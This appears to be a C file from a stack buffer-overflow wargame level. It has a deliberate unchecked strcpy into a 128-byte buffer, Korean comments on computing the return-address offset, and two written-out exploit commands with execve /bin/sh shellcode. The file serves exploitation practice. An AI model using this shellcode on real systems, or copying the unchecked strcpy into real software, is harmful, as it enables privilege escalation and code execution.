// AFTER => bof6.c
//       => shellcode.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128
#define R "\033[31m"
#define E "\033[0m"

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON
// vuln 함수에 맨 처음 들어갔을 때 rsp 를 확인하고 그 값에서 buf 와의 거리를 구한다. 그것을 x 라고 했을 때 (x + (8bytes 의 buf 주소값)) 이 페이로드가 되는 것이기 때문에 (x + 8) 의 쓰레기 값을 넣었을 때 buf 의 주소값을 확인한다. 
// ./bof7 `python -c "print 'a'*144"`
// EXPLOIT $ ./bof7 `python -c "print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'x'*109+'\x90\xe4\xff\xff\xff\x7f'"`
// EXPLOIT $ ./bof7 `python -c "print 'A'*13+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'A'*96+'\x90\xe4\xff\xff\xff\x7f'"`

void vuln(char * arg){
    char buf[BUF_SIZE];

    if (setreuid(UID_BOF8, UID_BOF8)) {
        perror("setuid");
        return 1;
    }
    if (setregid(UID_BOF8, UID_BOF8)) {
        perror("setgid");
        return 1;
    }

    strcpy(buf, arg);
    printf("Hello %s[%p]!\n", buf, buf);
}

int main(int c, char *v[]) {
    if (c < 2) {
        fputs(R "error :( this program needs some arguments\n" E, stderr);
        return 1;
    }
    vuln(v[1]);
    return 0;
}
